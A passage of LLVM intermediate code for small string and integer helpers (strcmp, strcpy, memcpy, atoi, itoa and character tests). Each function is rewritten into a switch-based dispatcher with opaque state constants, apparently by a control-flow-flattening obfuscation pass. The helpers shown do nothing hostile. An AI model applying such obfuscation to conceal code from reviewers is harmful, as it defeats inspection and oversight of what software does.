
; <label>:23:                                     ; preds = %loopEntry
  store i8 0, i8* %4, align 1
  store i32 -1820266300, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  store i32 -2086612601, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %7, align 4
  %27 = add nsw i32 %26, -1
  store i32 %27, i32* %7, align 4
  %28 = icmp ne i32 %26, 0
  %29 = select i1 %28, i32 -1591670033, i32 1932898934
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i8*, i8** %5, align 8
  %32 = getelementptr inbounds i8, i8* %31, i32 1
  store i8* %32, i8** %5, align 8
  %33 = load i8, i8* %31, align 1
  %34 = sext i8 %33 to i32
  %35 = load i8*, i8** %6, align 8
  %36 = getelementptr inbounds i8, i8* %35, i32 1
  store i8* %36, i8** %6, align 8
  %37 = load i8, i8* %35, align 1
  %38 = sext i8 %37 to i32
  %39 = icmp ne i32 %34, %38
  %40 = select i1 %39, i32 -685034734, i32 1541303439
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  store i8 0, i8* %4, align 1
  store i32 -1820266300, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  store i32 -2086612601, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i8 1, i8* %4, align 1
  store i32 -1820266300, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8, i8* %4, align 1
  ret i8 %45

loopEnd:                                          ; preds = %43, %42, %41, %30, %25, %24, %23, %18, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_strcmp(i8*, i8*) #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i8, align 1
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %8 = load i8*, i8** %4, align 8
  %9 = call i32 @util_strlen(i8* %8)
  store i32 %9, i32* %6, align 4
  %10 = load i8*, i8** %5, align 8
  %11 = call i32 @util_strlen(i8* %10)
  store i32 %11, i32* %7, align 4
  %12 = load i32, i32* %6, align 4
  store i32 %12, i32* %.reg2mem
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 846075873, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 846075873, label %first
    i32 669072185, label %16
    i32 88974517, label %17
    i32 -1392490087, label %18
    i32 -1543835928, label %23
    i32 1069375530, label %34
    i32 1253037646, label %35
    i32 -1537862275, label %36
    i32 -2054933290, label %37
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %14 = icmp ne i32 %.reload, %.reload3
  %15 = select i1 %14, i32 669072185, i32 88974517
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i8 0, i8* %3, align 1
  store i32 -2054933290, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 -1392490087, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %6, align 4
  %20 = add nsw i32 %19, -1
  store i32 %20, i32* %6, align 4
  %21 = icmp ne i32 %19, 0
  %22 = select i1 %21, i32 -1543835928, i32 -1537862275
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8*, i8** %4, align 8
  %25 = getelementptr inbounds i8, i8* %24, i32 1
  store i8* %25, i8** %4, align 8
  %26 = load i8, i8* %24, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %5, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %5, align 8
  %30 = load i8, i8* %28, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp ne i32 %27, %31
  %33 = select i1 %32, i32 1069375530, i32 1253037646
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 0, i8* %3, align 1
  store i32 -2054933290, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 -1392490087, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i8 1, i8* %3, align 1
  store i32 -2054933290, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8, i8* %3, align 1
  ret i8 %38

loopEnd:                                          ; preds = %36, %35, %34, %23, %18, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  %switchVar = alloca i32
  store i32 -819903523, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -819903523, label %11
    i32 -300576408, label %16
    i32 467447916, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  %15 = select i1 %14, i32 -300576408, i32 467447916
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i8*, i8** %8, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %8, align 8
  %19 = load i8, i8* %17, align 1
  %20 = load i8*, i8** %7, align 8
  %21 = getelementptr inbounds i8, i8* %20, i32 1
  store i8* %21, i8** %7, align 8
  store i8 %19, i8* %20, align 1
  store i32 -819903523, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @util_zero(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  %switchVar = alloca i32
  store i32 1638717071, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1638717071, label %7
    i32 830141526, label %12
    i32 458165270, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i32, i32* %4, align 4
  %9 = add nsw i32 %8, -1
  store i32 %9, i32* %4, align 4
  %10 = icmp ne i32 %8, 0
  %11 = select i1 %10, i32 830141526, i32 458165270
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %5, align 8
  store i8 0, i8* %13, align 1
  store i32 1638717071, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %12, %7, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_atoi(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 -78972854, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -78972854, label %11
    i32 292361451, label %16
    i32 450924845, label %22
    i32 -2096622984, label %26
    i32 426304250, label %31
    i32 -292547870, label %35
    i32 1207031332, label %40
    i32 -929597961, label %41
    i32 -227234400, label %54
    i32 955598153, label %60
    i32 1063342291, label %63
    i32 -312185381, label %69
    i32 271437809, label %77
    i32 -895542739, label %78
    i32 -725214311, label %79
    i32 -883392020, label %84
    i32 610606361, label %85
    i32 -1232357957, label %89
    i32 -202152755, label %94
    i32 -767600982, label %99
    i32 -442842113, label %104
    i32 -1773563103, label %105
    i32 -1760481027, label %114
    i32 -170801420, label %115
    i32 612102358, label %120
    i32 -584459371, label %124
    i32 -1055039451, label %128
    i32 760357467, label %132
    i32 107849812, label %135
    i32 -293271295, label %136
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i8*, i8** %3, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %3, align 8
  %14 = load i8, i8* %12, align 1
  %15 = sext i8 %14 to i32
  store i32 %15, i32* %6, align 4
  store i32 292361451, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i32, i32* %6, align 4
  %18 = trunc i32 %17 to i8
  %19 = call i32 @util_isspace(i8 signext %18)
  %20 = icmp ne i32 %19, 0
  %21 = select i1 %20, i32 -78972854, i32 450924845
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %6, align 4
  %24 = icmp eq i32 %23, 45
  %25 = select i1 %24, i32 -2096622984, i32 426304250
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i32 1, i32* %8, align 4
  %27 = load i8*, i8** %3, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %3, align 8
  %29 = load i8, i8* %27, align 1
  %30 = sext i8 %29 to i32
  store i32 %30, i32* %6, align 4
  store i32 -929597961, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %6, align 4
  %33 = icmp eq i32 %32, 43
  %34 = select i1 %33, i32 -292547870, i32 1207031332
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %3, align 8
  %37 = getelementptr inbounds i8, i8* %36, i32 1
  store i8* %37, i8** %3, align 8
  %38 = load i8, i8* %36, align 1
  %39 = sext i8 %38 to i32
  store i32 %39, i32* %6, align 4
  store i32 1207031332, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  store i32 -929597961, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %8, align 4
  %43 = icmp ne i32 %42, 0
  %44 = select i1 %43, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %44, i64* %7, align 8
  %45 = load i64, i64* %7, align 8
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = urem i64 %45, %47
  %49 = trunc i64 %48 to i32
  store i32 %49, i32* %10, align 4
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = load i64, i64* %7, align 8
  %53 = udiv i64 %52, %51
  store i64 %53, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  store i32 -227234400, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %6, align 4
  %56 = trunc i32 %55 to i8
  %57 = call i32 @util_isdigit(i8 signext %56)
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 955598153, i32 1063342291
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %6, align 4
  %62 = sub nsw i32 %61, 48
  store i32 %62, i32* %6, align 4
  store i32 -725214311, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* %6, align 4
  %65 = trunc i32 %64 to i8
  %66 = call i32 @util_isalpha(i8 signext %65)
  %67 = icmp ne i32 %66, 0
  %68 = select i1 %67, i32 -312185381, i32 271437809
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %6, align 4
  %71 = trunc i32 %70 to i8
  %72 = call i32 @util_isupper(i8 signext %71)
  %73 = icmp ne i32 %72, 0
  %74 = select i1 %73, i32 55, i32 87
  %75 = load i32, i32* %6, align 4
  %76 = sub nsw i32 %75, %74
  store i32 %76, i32* %6, align 4
  store i32 -895542739, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 612102358, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 -725214311, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %6, align 4
  %81 = load i32, i32* %4, align 4
  %82 = icmp sge i32 %80, %81
  %83 = select i1 %82, i32 -883392020, i32 610606361
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  store i32 612102358, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  %86 = load i32, i32* %9, align 4
  %87 = icmp slt i32 %86, 0
  %88 = select i1 %87, i32 -442842113, i32 -1232357957
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i64, i64* %5, align 8
  %91 = load i64, i64* %7, align 8
  %92 = icmp ugt i64 %90, %91
  %93 = select i1 %92, i32 -442842113, i32 -202152755
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i64, i64* %5, align 8
  %96 = load i64, i64* %7, align 8
  %97 = icmp eq i64 %95, %96
  %98 = select i1 %97, i32 -767600982, i32 -1773563103
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %6, align 4
  %101 = load i32, i32* %10, align 4
  %102 = icmp sgt i32 %100, %101
  %103 = select i1 %102, i32 -442842113, i32 -1773563103
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  store i32 -1, i32* %9, align 4
  store i32 -1760481027, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %106 = load i32, i32* %4, align 4
  %107 = sext i32 %106 to i64
  %108 = load i64, i64* %5, align 8
  %109 = mul i64 %108, %107
  store i64 %109, i64* %5, align 8
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = load i64, i64* %5, align 8
  %113 = add i64 %112, %111
  store i64 %113, i64* %5, align 8
  store i32 -1760481027, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  store i32 -170801420, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i8*, i8** %3, align 8
  %117 = getelementptr inbounds i8, i8* %116, i32 1
  store i8* %117, i8** %3, align 8
  %118 = load i8, i8* %116, align 1
  %119 = sext i8 %118 to i32
  store i32 %119, i32* %6, align 4
  store i32 -227234400, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %9, align 4
  %122 = icmp slt i32 %121, 0
  %123 = select i1 %122, i32 -584459371, i32 -1055039451
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i32, i32* %8, align 4
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %127, i64* %5, align 8
  store i32 -293271295, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i32, i32* %8, align 4
  %130 = icmp ne i32 %129, 0
  %131 = select i1 %130, i32 760357467, i32 107849812
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i64, i64* %5, align 8
  %134 = sub i64 0, %133
  store i64 %134, i64* %5, align 8
  store i32 107849812, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  store i32 -293271295, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i64, i64* %5, align 8
  %138 = trunc i64 %137 to i32
  ret i32 %138

loopEnd:                                          ; preds = %135, %132, %128, %124, %120, %115, %114, %105, %104, %99, %94, %89, %85, %84, %79, %78, %77, %69, %63, %60, %54, %41, %40, %35, %31, %26, %22, %16, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isspace(i8 signext) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1094140975, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1094140975, label %first
    i32 -68596325, label %7
    i32 1295859204, label %12
    i32 -256538252, label %17
    i32 -94232190, label %21
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp eq i32 %.reload, 32
  %6 = select i1 %5, i32 -94232190, i32 -68596325
  store i32 %6, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8, i8* %2, align 1
  %9 = sext i8 %8 to i32
  %10 = icmp eq i32 %9, 9
  %11 = select i1 %10, i32 -94232190, i32 1295859204
  store i32 %11, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8, i8* %2, align 1
  %14 = sext i8 %13 to i32
  %15 = icmp eq i32 %14, 10
  %16 = select i1 %15, i32 -94232190, i32 -256538252
  store i32 %16, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i8, i8* %2, align 1
  %19 = sext i8 %18 to i32
  %20 = icmp eq i32 %19, 10
  store i32 -94232190, i32* %switchVar
  store i1 %20, i1* %.reg2mem2
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %22 = zext i1 %.reload3 to i32
  ret i32 %22

loopEnd:                                          ; preds = %17, %12, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isdigit(i8 signext) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1089635731, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1089635731, label %first
    i32 -423287439, label %7
    i32 901669484, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sge i32 %.reload, 48
  %6 = select i1 %5, i32 -423287439, i32 901669484
  store i32 %6, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8, i8* %2, align 1
  %9 = sext i8 %8 to i32
  %10 = icmp sle i32 %9, 57
  store i32 901669484, i32* %switchVar
  store i1 %10, i1* %.reg2mem2
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %12 = zext i1 %.reload3 to i32
  ret i32 %12

loopEnd:                                          ; preds = %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isalpha(i8 signext) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 836923039, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 836923039, label %first
    i32 -296284397, label %7
    i32 408666704, label %12
    i32 989831362, label %17
    i32 -978559893, label %21
    i32 -1684258644, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sge i32 %.reload, 65
  %6 = select i1 %5, i32 -296284397, i32 408666704
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8, i8* %2, align 1
  %9 = sext i8 %8 to i32
  %10 = icmp sle i32 %9, 90
  %11 = select i1 %10, i32 -1684258644, i32 408666704
  store i32 %11, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8, i8* %2, align 1
  %14 = sext i8 %13 to i32
  %15 = icmp sge i32 %14, 97
  %16 = select i1 %15, i32 989831362, i32 -978559893
  store i32 %16, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i8, i8* %2, align 1
  %19 = sext i8 %18 to i32
  %20 = icmp sle i32 %19, 122
  store i32 -978559893, i32* %switchVar
  store i1 %20, i1* %.reg2mem2
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  store i32 -1684258644, i32* %switchVar
  store i1 %.reload3, i1* %.reg2mem4
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %.reload5 = load i1, i1* %.reg2mem4
  %23 = zext i1 %.reload5 to i32
  ret i32 %23

loopEnd:                                          ; preds = %21, %17, %12, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isupper(i8 signext) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -705622997, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -705622997, label %first
    i32 -582501860, label %7
    i32 175386538, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sge i32 %.reload, 65
  %6 = select i1 %5, i32 -582501860, i32 175386538
  store i32 %6, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8, i8* %2, align 1
  %9 = sext i8 %8 to i32
  %10 = icmp sle i32 %9, 90
  store i32 175386538, i32* %switchVar
  store i1 %10, i1* %.reg2mem2
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %12 = zext i1 %.reload3 to i32
  ret i32 %12

loopEnd:                                          ; preds = %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i8* @util_itoa(i32, i32, i8*) #0 {
  %.reg2mem = alloca i8*
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca [34 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %7, align 8
  store i8* %13, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 -1990521555, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1990521555, label %first
    i32 -464684566, label %16
    i32 -846019880, label %17
    i32 -1716844418, label %21
    i32 532653291, label %26
    i32 -1784824591, label %30
    i32 9789859, label %33
    i32 1452560489, label %35
    i32 2060490613, label %36
    i32 1603060886, label %40
    i32 2066356697, label %47
    i32 874002248, label %50
    i32 854093071, label %53
    i32 498589684, label %64
    i32 2132965209, label %68
    i32 1253410436, label %72
    i32 -1318191004, label %75
    i32 254249126, label %81
    i32 -260636667, label %86
    i32 -967448581, label %88
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %14 = icmp eq i8* %.reload, null
  %15 = select i1 %14, i32 -464684566, i32 -846019880
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i8* null, i8** %4, align 8
  store i32 -967448581, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %5, align 4
  %19 = icmp ne i32 %18, 0
  %20 = select i1 %19, i32 -1716844418, i32 254249126
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 32, i32* %10, align 4
  %22 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 33
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %6, align 4
  %24 = icmp eq i32 %23, 10
  %25 = select i1 %24, i32 532653291, i32 9789859
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32, i32* %5, align 4
  %28 = icmp slt i32 %27, 0
  %29 = select i1 %28, i32 -1784824591, i32 9789859
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %31 = load i32, i32* %5, align 4
  %32 = sub nsw i32 0, %31
  store i32 %32, i32* %12, align 4
  store i32 1452560489, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  %34 = load i32, i32* %5, align 4
  store i32 %34, i32* %12, align 4
  store i32 1452560489, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 2060490613, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %12, align 4
  %38 = icmp ne i32 %37, 0
  %39 = select i1 %38, i32 1603060886, i32 498589684
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %12, align 4
  %42 = load i32, i32* %6, align 4
  %43 = urem i32 %41, %42
  store i32 %43, i32* %11, align 4
  %44 = load i32, i32* %11, align 4
  %45 = icmp slt i32 %44, 10
  %46 = select i1 %45, i32 2066356697, i32 874002248
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %11, align 4
  %49 = add nsw i32 %48, 48
  store i32 %49, i32* %11, align 4
  store i32 854093071, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %11, align 4
  %52 = add nsw i32 %51, 55
  store i32 %52, i32* %11, align 4
  store i32 854093071, i32* %switchVar
  br label %loopEnd

